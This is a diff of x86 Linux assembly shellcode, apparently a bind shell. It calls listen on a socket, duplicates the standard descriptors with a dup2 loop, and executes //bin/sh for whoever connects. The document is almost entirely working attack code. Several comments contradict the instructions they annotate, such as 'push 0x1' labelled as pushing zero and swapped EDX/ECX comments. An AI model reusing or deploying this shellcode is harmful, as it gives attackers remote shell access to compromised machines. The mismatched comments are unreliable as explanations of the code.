@@ -37,8 +37,8 @@ _start:
 
 	;int listen(int sockfd, int backlog)
 	xor eax, eax		; zero out EAX
-	push eax		; push 0x00 on the stack
-	push byte 1		; put 1 on the stack
+	push eax		; put 0x00 on the stack
+	push 0x1 		; put 0x00 on the stack
 	push edi		; put address of the socketfd on the stack
 	mov ecx, esp		; put address of all the arguments for the listen function in ECX
 	add ebx, 2              ; add 2 to EBX, listen = 4
@@ -60,7 +60,6 @@ _start:
 
 	xor ecx, ecx		; zero out ECX
 	mov cl, 2		; put 2 (STDIN, STOUT, STERR) in ECX
-	xor eax, eax		; zero out EAX
 
 dup2_loop:
 	
@@ -68,7 +67,7 @@ dup2_loop:
 	mov al, 63		; put 63 dup2 syscall in EAX
 	int 0x80		; execute syscall dup2
 	dec ecx			; decrement ecx with 1
-	jnz dup2_loop		; jump to dup2_loop as long as ECX is not 0, zero flag is set
+	jne dup2_loop		; jump to dup2_loop as long as ECX is not 0, zero flag is set
 
 
 	;int execve(const char *filename, char *const argv[], char *const envp[])
@@ -78,8 +77,9 @@ dup2_loop:
 	push 0x6e69622f		; put hs/ on the stack
 	mov ebx, esp		; put address of //bin/sh int EBX
 	push eax		; put 0x00 on the stack
-	mov edx, esp		; put address of NULL in EDX
-	push ebx		; put address of //bin/sh on the stack
-	mov ecx, esp		; put address of //bin/sh in ECX
+	push ebx
+	mov ecx, esp		; put address of NULL in EDX
+	push eax		; put address of //bin/sh on the stack
+	mov edx, esp		; put address of //bin/sh in ECX
 	mov al, 11		; put 11 in EAX, syscall execve
 	int 0x80		; execute syscall execve
